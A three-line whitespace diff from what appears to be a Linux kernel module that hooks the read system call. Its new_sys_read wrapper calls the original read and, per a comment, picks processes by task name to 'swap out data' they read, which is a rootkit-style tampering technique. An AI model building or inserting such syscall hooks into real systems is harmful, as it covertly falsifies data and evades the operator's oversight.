@@ -33,7 +33,6 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
      */
     long ret;
     ret = ref_sys_read(fd, buf, count);
-    
     if (ret >= 6 && fd > 2) {
         /* We can find the current task name from the current task struct
          * then use that to decide if we'd like to swap out data
